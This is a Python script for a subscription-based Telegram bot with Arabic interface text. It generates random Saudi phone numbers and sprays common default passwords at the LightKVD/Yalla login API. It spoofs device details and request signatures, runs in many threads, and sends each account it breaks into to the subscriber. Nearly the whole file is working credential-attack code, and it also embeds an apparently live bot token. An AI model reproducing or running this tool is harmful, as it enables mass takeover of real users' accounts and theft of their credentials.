import base64
import hashlib
import hmac as _hmac
import json
import os
import random
import sys
import time
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== إعدادات التلغرام (معرفاتك والتوكن) ====================
BOT_TOKEN = "8844579780:AAF8oAN9eRfUK72kZL6e2BQJYYDj_06ZzAg"  # التوكن الجديد
ADMIN_ID = 8795120325                                         # الآيدي الخاص بك (المطور)
SUBS_FILE = "subscriptions.json"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ==================== مفاتيح وثوابت النظام الأساسية ====================
KEY_A = (
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1a2EqCh8Tqg31StFMA++MZz7u+IC"
    "bOjZcavdG6obAhzxM4UJlJBNZ527KaVbkkEIR2QNf7V/ezpl5jRl5Z4B2KTwBXoIbHZG2qo6"
    "Z7ZOKRCkdryuQbA7IRJxqb1H3EC4xmVk8PNNuHpnV8v99bzrvo4mYUv+9+35kfFg7QEW7bR7"
    "de/cPsbXZ7xRwWSbYUBEU2wATW+mL36iWd72SFbvH4dXF1+db8EhKnYSkRZtou39eWfRLKcg"
    "cAakaxK79R0V7mi/CcnG6+zFY2nn3S905dIgXIV2jn2QV7+dtFuxAY6vkCNgnyECyIlJo0Jk"
    "9Ajl0WzrDn2VzLi6+dz0BP/ElwIDAQAB"
)
KEY_B = (
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkSNNnjBZ/aFYquwA2gIin8l9kS16"
    "tPGcyHu7FWkTH3My/qBFG3mmD6Q/jdZW3kZ4eHyzISca02opHhyWc1ic/KCqHBLQiyR947Ln"
    "H3N0u01mZdcdwSfKQ290Yep1YBRFgV/D2gVfxa9v1LihADR94qw5kpJbHo/CMqoXqrr4L8EN"
    "KPztZOmuClg0SN9eJlXZSSxIuU2cwqd3eDwN3OyPCyUq2v5LIEK1gaKaeE7hlMuwUVB6ArNSo"
    "5K8Mcx93OFJZkGdARB6UT+CaRuJAvv937tOH/2UHpWHP5nknk1aUU4mEaKRzzGR7rOR/Djbz"
    "vhKI683YiEChw/LnWvKQFowbQIDAQAB"
)
SALT   = "$2b$04$1gzmpIl.6S1FuI7hMzWqDO"
CHARS  = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678"
URL    = "https://api.lightkvd.com/v1/account/login"
APP_ID = "613687415143137"

DEVS   = [
    ("OnePlus 9 Pro",      "LE2123"),    ("Samsung Galaxy S21", "SM-G991B"),
    ("Xiaomi Mi 11",       "M2011K2G"), ("Realme GT",           "RMX2202"),
    ("Oppo Reno 6",        "CPH2235"),  ("Vivo X60 Pro",        "V2046"),
    ("Samsung Galaxy A52", "SM-A525F"), ("Oppo A96",            "CPH2469"),
    ("Infinix Hot 20",     "X6826"),    ("Tecno Spark 10",      "KI5q"),
]

CODES  = {
    30052: ("NOT_REGISTERED", "Phone not registered"),
    30101: ("WRONG_PASSWORD", "Wrong password"),
    30107: ("VALID",          "Password correct — new device, SMS verify needed"),
    30201: ("RATE_LIMITED",   "Too many attempts — rate limited"),
}

DEFAULT_PASSWORDS = [
    'Aa123456',
    'Aa12345678',
    'Aa12312300',
    'Aa123123',
    'Aa11223300',
]

# دالة الجلسات لكل خيط لضمان السرعة ومنع تداخل الاتصالات
thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = requests.Session()
    return thread_local.session

# دوال التشفير الأساسية الخاصة بك
rsa_enc = lambda t, k: base64.b64encode(
    PKCS1_v1_5.new(
        RSA.import_key(f"-----BEGIN PUBLIC KEY-----\n{k}\n-----END PUBLIC KEY-----")
    ).encrypt(t.encode("utf-8"))
).decode()

md5h    = lambda s: hashlib.md5(s.encode("utf-8")).hexdigest()
sha2h   = lambda s: hashlib.sha256(s.encode("utf-8")).hexdigest()
phash   = lambda pw: md5h(sha2h(pw) + SALT)
rstr    = lambda n=6: "".join(random.choice(CHARS) for _ in range(n))
prms    = lambda d: "&".join(f"{k}={v}" for k, v in sorted(d.items()))
clrp    = lambda p: p.strip().replace(" ", "").lstrip("0")
rdev    = lambda: random.choice(DEVS)
icon_of = lambda s: {"VALID": "✅", "NOT_REGISTERED": "🚫", "RATE_LIMITED": "⏳",
                     "ERROR": "⚠️", "WRONG_PASSWORD": "❌"}.get(s, "❓")

# ==================== نظام إدارة الاشتراكات ====================
def load_subscriptions() -> dict:
    if os.path.exists(SUBS_FILE):
        try:
            with open(SUBS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_subscriptions(subs: dict):
    with open(SUBS_FILE, "w", encoding="utf-8") as f:
        json.dump(subs, f, ensure_ascii=False, indent=4)

def is_user_active(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    subs = load_subscriptions()
    str_uid = str(user_id)
    if str_uid in subs:
        if time.time() < subs[str_uid]:
            return True
    return False

# قاموس لتتبع حالة الفحص الخاصة بكل مستخدم بشكل مستقل تماماً
user_active_scans: dict = {}

# ==================== دالة تسجيل الدخول (LightKVD) ====================
def _do_login(phone: str, pw: str, region: int = 966, timeout: int = 20) -> dict:
    session = get_session()
    dname, model = rdev()
    _uid     = str(uuid.uuid4())
    _cleaned = clrp(phone)
    _osv     = str(random.randint(28, 33))
    _ts      = str(int(time.time() * 1000))
    _nc      = rstr(6)
    _n       = rstr(6)
    
    _body    = {
        "equipment_model": model,  "os_version":     _osv,
        "equipment_type":  model,  "device_name":    model,
        "phone_num":       rsa_enc(_cleaned, KEY_B),
        "region_telcode":  region,  "acc_password":   phash(pw),
        "app_id":          APP_ID,  "device_type":    1,
        "device_no":       rsa_enc(_uid, KEY_B),
        "redirect_uri":    "https://www.yallaludo.com/",
        "acc_language":    1,
    }
    _can = f"biz_content={{{prms(_body)}}}&nonce={_nc}&timestamp={_ts}"
    _sn  = base64.b64encode(
        _hmac.new(_n.encode(), md5h(_can).encode(), hashlib.sha256)
        .hexdigest().encode()
    ).decode()
    _sk  = rsa_enc(_n, KEY_A)
    
    _hdrs = {
        "User-Agent": (
            f"Mozilla/5.0 (Linux; Android {_osv}; {model}) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36"
        ),
        "Accept":           "application/json, text/plain, */*",
        "sn":               _sn,
        "sk":               _sk,
        "acc_language":     "2",  "app_platform":     "3",
        "sdk_version":      "1.1.1", "open_version":  "1.1.1",
        "sdk-version":      "1.1.1", "web-version":   "1.0.0",
        "content-type":     "application/json;charset=UTF-8",
        "platform":         "1",
        "origin":           "https://api.lightkvd.com",
        "x-requested-with": "com.yalla.yallagames",
        "referer":          "https://api.lightkvd.com/login",
        "accept-language":  "ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie":           f"cna={uuid.uuid4().hex[:16]}",
    }
    
    try:
        _rr = session.post(
            URL,
            params={"timestamp": _ts, "nonce": _nc},
            data=json.dumps(_body),
            headers=_hdrs,
            timeout=timeout,
        )
        _j    = _rr.json() if _rr.content else None
        _code = _j.get("code") if _j else None
        
        if _code in CODES:
            return {"status": CODES[_code][0], "code": _code, "message": CODES[_code][1], "dev": {"name": dname, "model": model}}
        elif _code in (0, None) and _j and _j.get("data"):
            return {"status": "VALID", "code": _code, "message": "Full login success", "data": _j.get("data"), "dev": {"name": dname, "model": model}}
        elif _j is None:
            return {"status": "ERROR", "message": f"HTTP {_rr.status_code} non-JSON", "dev": {"name": dname, "model": model}}
        else:
            return {"status": "UNKNOWN", "code": _code, "message": _j.get("message", "")[:80], "dev": {"name": dname, "model": model}}
    except Exception as e:
        return {"status": "ERROR", "message": str(e), "dev": {"name": dname, "model": model}}

def generate_random_phone():
    prefixes = ["50", "53", "55", "56", "54", "58", "59"]
    return random.choice(prefixes) + "".join([str(random.randint(0, 9)) for _ in range(7)])

# ==================== واجهات الأزرار (Keyboards) ====================
def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("بدء الفحص", callback_data="start_scan"))
    markup.add(InlineKeyboardButton("تفاصيل الاشتراك", callback_data="my_sub"))
    if user_id == ADMIN_ID:
        markup.add(InlineKeyboardButton("اعدادات البوت", callback_data="admin_panel"))
    return markup

def get_scanning_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("ايقاف الفحص", callback_data="stop_scan"))
    return markup

def get_admin_keyboard() -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("تفعيل مشترك", callback_data="admin_add"))
    markup.add(InlineKeyboardButton("حذف مشترك", callback_data="admin_del"))
    markup.add(InlineKeyboardButton("المشتركين الكلي", callback_data="admin_list"))
    markup.add(InlineKeyboardButton("رجوع", callback_data="main_menu"))
    return markup

# ==================== معالجة أوامر التلغرام ====================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    if not is_user_active(user_id):
        bot.reply_to(message, "انت غير مشترك راسل المطور @aboodriad")
        return
    
    welcome_text = (
        "<b>مرحبا بك عزيزي\nلوحة المشترك الخاصة\nاختصاص فحص حسابات يلا شات داخلي\n\nقم بتشغيل البوت من خلال بدء الفحص</b>"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if not is_user_active(user_id) and call.data != "my_sub":
        try:
            bot.answer_callback_query(call.id, "الاشتراك منتهي (:", show_alert=True)
        except Exception:
            pass
        return

    if call.data == "main_menu":
        if user_id in user_active_scans:
            user_active_scans[user_id]["running"] = False
        try:
            bot.edit_message_text("<b>مرحبا بك عزيزي\nلوحة المشترك الخاصة\nاختصاص فحص حسابات يلا شات داخلي\n\nقم بتشغيل البوت من خلال بدء الفحص</b>", chat_id, message_id, reply_markup=get_main_keyboard(user_id))
        except Exception:
            pass

    elif call.data == "my_sub":
        subs = load_subscriptions()
        str_uid = str(user_id)
        if user_id == ADMIN_ID:
            sub_status = "انت مدير البوت"
        elif str_uid in subs and time.time() < subs[str_uid]:
            rem_days = int((subs[str_uid] - time.time()) / 86400)
            sub_status = f"الاشتراك الخاص بك : {rem_days}"
        else:
            sub_status = "غير فعال ❌"
        
        text = f"<b>معلومات حسابك :</b>\nالآيدي : <code>{user_id}</code>\n📌 الحالة : {sub_status}"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("رجوع", callback_data="main_menu"))
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data == "start_scan":
        if user_id in user_active_scans and user_active_scans[user_id].get("running"):
            try:
                bot.answer_callback_query(call.id, "عملية الفحص تعمل لديك بالفعل!", show_alert=True)
            except Exception:
                pass
            return

        try:
            bot.delete_message(chat_id, message_id)
        except Exception:
            pass

        scan_msg = bot.send_message(
            chat_id,
            "<b>جاري فحص الحسابات</b>\n\n"
            "تم صيد : 0\n"
            "غير مسجل : 0\n"
            "الاخطاء : 0",
            reply_markup=get_scanning_keyboard()
        )

        # تهيئة عزل الحالة الخاصة بهذا المستخدم حصرياً
        user_active_scans[user_id] = {
            "running": True,
            "valid": 0,
            "not_registered": 0,
            "error": 0,
            "message_id": scan_msg.message_id
        }

        # تشغيل خيوط الفحص المستقلة للمستخدم
        threading.Thread(target=run_user_scanner, args=(user_id, chat_id, scan_msg.message_id), daemon=True).start()

    elif call.data == "stop_scan":
        if user_id in user_active_scans:
            user_active_scans[user_id]["running"] = False
        try:
            bot.answer_callback_query(call.id, "تم إيقاف الفحص")
            bot.edit_message_text(
                "<b>تم إيقاف عملية الفحص الخاصة بك بنجاح</b>",
                chat_id, message_id,
                reply_markup=get_main_keyboard(user_id)
            )
        except Exception:
            pass

    # لوحة تحكم المطور
    elif call.data == "admin_panel" and user_id == ADMIN_ID:
        text = "⚙️ <b>لوحة تحكم المطور:</b>\nاختر العملية المطلوبة:"
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=get_admin_keyboard())
        except Exception:
            pass

    elif call.data == "admin_add" and user_id == ADMIN_ID:
        try:
            msg = bot.send_message(chat_id, "✍️ أرسل الآيدي وعدد أيام الاشتراك بالصيغة التالية:\n<code>ID DAYS</code>\nمثال:\n<code>123456789 7</code>")
            bot.register_next_step_handler(msg, process_add_sub)
        except Exception:
            pass

    elif call.data == "admin_del" and user_id == ADMIN_ID:
        try:
            msg = bot.send_message(chat_id, "✍️ أرسل آيدي المستخدم المراد حذفه:\nمثال:\n<code>123456789</code>")
            bot.register_next_step_handler(msg, process_del_sub)
        except Exception:
            pass

    elif call.data == "admin_list" and user_id == ADMIN_ID:
        subs = load_subscriptions()
        if not subs:
            text = "📋 لا توجد اشتراكات مسجلة حالياً."
        else:
            text = "📋 <b>قائمة المشتركين النشطين:</b>\n\n"
            for uid, exp in subs.items():
                if time.time() < exp:
                    days_left = int((exp - time.time()) / 86400)
                    text += f"• <code>{uid}</code> (متبقي {days_left} يوم)\n"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        except Exception:
            pass

# ==================== خيوط الفحص المعزولة للمستخدم ====================
def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
    region = 966
    max_threads = 8  # عدد الخيوط لكل مستخدم لضمان السرعة

    def worker():
        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
            phone = generate_random_phone()
            first_pw = DEFAULT_PASSWORDS[0]
            
            try:
                res = _do_login(phone, first_pw, region)
                st = res.get("status", "ERROR")
            except Exception:
                if user_id in user_active_scans:
                    user_active_scans[user_id]["error"] += 1
                continue

            if st == "NOT_REGISTERED":
                if user_id in user_active_scans:
                    user_active_scans[user_id]["not_registered"] += 1
                continue

            for pw in DEFAULT_PASSWORDS:
                if pw != first_pw:
                    try:
                        res = _do_login(phone, pw, region)
                        st = res.get("status", "ERROR")
                    except Exception:
                        break

                if st == "VALID":
                    if user_id in user_active_scans:
                        user_active_scans[user_id]["valid"] += 1
                    
                    # إرسال تنبيه الصيد للمستخدم مباشرة
                    alert_text = (
                        f"<b>تم صيد حساب يلا شات</b>\n\n"
                        f"<b>Phone :</b> {phone}\n"
                        f"<b>Password :</b> {pw}\n"
                        f"By : @aboodriad"
                    )
                    try:
                        bot.send_message(chat_id, alert_text)
                    except Exception:
                        pass
                    break
                elif st == "ERROR" or st == "RATE_LIMITED":
                    if user_id in user_active_scans:
                        user_active_scans[user_id]["error"] += 1

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for _ in range(max_threads):
            if user_id in user_active_scans and user_active_scans[user_id]["running"]:
                executor.submit(worker)

        last_text = ""
        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
            state = user_active_scans[user_id]
            v = state["valid"]
            nr = state["not_registered"]
            e = state["error"]

            status_text = (
                "<b>جاري فحص الحسابات</b>\n\n"
                "تم صيد : {v}\n"
                "غير مسجل : {nr}\n"
                "الاخطاء : {e}",
            )

            if status_text != last_text:
                try:
                    bot.edit_message_text(
                        status_text,
                        chat_id,
                        scan_msg_id,
                        reply_markup=get_scanning_keyboard()
                    )
                    last_text = status_text
                except Exception:
                    pass
            time.sleep(1.5)

# ==================== دوال المطور (تفعيل وحذف الاشتراكات) ====================
def process_add_sub(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        parts = message.text.strip().split()
        target_id = parts[0]
        days = int(parts[1])
        
        subs = load_subscriptions()
        subs[target_id] = time.time() + (days * 86400)
        save_subscriptions(subs)
        
        bot.reply_to(message, f"✅ تم تفعيل المستخدم <code>{target_id}</code> لمدة {days} يوم بنجاح.")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ في الصيغة: {e}")

def process_del_sub(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        target_id = message.text.strip()
        subs = load_subscriptions()
        if target_id in subs:
            del subs[target_id]
            save_subscriptions(subs)
            bot.reply_to(message, f"✅ تم حذف تفعيل المستخدم <code>{target_id}</code> بنجاح.")
        else:
            bot.reply_to(message, "❌ المستخدم غير موجود في القائمة.")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

# ==================== تشغيل البوت مع نظام منع التوقف (Auto-Reconnect) ====================
if __name__ == "__main__":
    print("🤖 LightKVD Telegram Bot is running with Auto-Reconnect & Isolated UIs...")
    while True:
        try:
            bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"⚠️ حدث انقطاع في الاتصال أو خطأ بالشبكة: {e}")
            print("🔄 جاري إعادة الاتصال تلقائياً خلال 5 ثوانٍ...")
            time.sleep(5)
